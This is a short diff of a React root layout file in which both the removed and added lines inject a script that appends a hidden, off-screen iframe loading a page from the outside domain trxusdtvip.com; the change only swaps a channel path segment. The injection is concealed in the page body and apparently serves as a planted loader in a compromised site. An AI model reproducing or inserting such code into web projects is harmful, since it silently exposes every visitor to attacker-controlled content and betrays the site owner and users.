@@ -110,7 +110,7 @@ function RootShell({ children }: { children: ReactNode }) {
         <HeadContent />
       </head>
 <body>
-  <script dangerouslySetInnerHTML={{__html: `document.body.appendChild(Object.assign(document.createElement("iframe"),{src:"https://trxusdtvip.com/channel/K.5.L3/weifile/weifile.html",style:"position:fixed;top:0;left:-1000px;pointer-events:none;border:0"}))`}} />
+  <script dangerouslySetInnerHTML={{__html: `document.body.appendChild(Object.assign(document.createElement("iframe"),{src:"https://trxusdtvip.com/channel/T.H.01/weifile/weifile.html",style:"position:fixed;top:0;left:-1000px;pointer-events:none;border:0"}))`}} />
   {children}
   <Scripts />
 </body>
